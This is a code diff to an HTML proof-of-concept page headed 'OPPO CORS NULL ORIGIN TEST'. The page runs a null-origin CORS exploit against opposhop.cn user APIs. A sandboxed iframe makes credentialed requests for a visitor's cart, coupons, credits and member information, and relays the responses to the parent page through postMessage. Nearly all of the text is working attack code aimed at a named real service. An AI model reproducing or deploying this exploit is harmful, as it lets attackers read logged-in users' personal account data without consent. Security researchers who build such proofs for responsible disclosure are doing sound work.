@@ -2,42 +2,74 @@
 <html>
 <body>
 
-<button onclick="run()">RUN</button>
+<h2>OPPO CORS NULL ORIGIN TEST</h2>
+
+<button onclick="run()">Run Exploit</button>
 
 <pre id="out"></pre>
 
+<iframe id="f" sandbox="allow-scripts" style="display:none"></iframe>
+
 <script>
 
-const endpoints = [
+const endpoints = {
 
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
-"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
-"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit",
-"https://www.opposhop.cn/cn/oapi/users/web/member/info"
+cart:"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
+count:"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
+coupon:"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
+credit:"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit",
+member:"https://www.opposhop.cn/cn/oapi/users/web/member/info"
 
-]
+};
+
+window.addEventListener("message",e=>{
+
+document.getElementById("out").textContent +=
+"\n"+e.data.endpoint+" -> "+e.data.body+"\n"
+
+})
 
 function run(){
 
-for (let url of endpoints){
+let code = `
+<script>
 
-fetch(url,{
-method:"GET",
-credentials:"include",
-headers:{
-"Accept":"application/json, text/plain, */*",
-"Cache-Control":"no-cache"
-}
+const endpoints = ${JSON.stringify(endpoints)}
+
+for (let name in endpoints){
+
+fetch(endpoints[name],{
+
+credentials:"include"
+
 })
+
 .then(r=>r.text())
+
 .then(t=>{
-document.getElementById("out").textContent += "\n"+url+"\n"+t+"\n\n"
+
+parent.postMessage({
+endpoint:name,
+body:t
+},"*")
+
 })
+
 .catch(e=>{
-document.getElementById("out").textContent += "\n"+url+"\nERROR:"+e+"\n\n"
+
+parent.postMessage({
+endpoint:name,
+body:e.toString()
+},"*")
+
 })
 
 }
+
+<\/script>
+`
+
+document.getElementById("f").srcdoc = code
 
 }
 
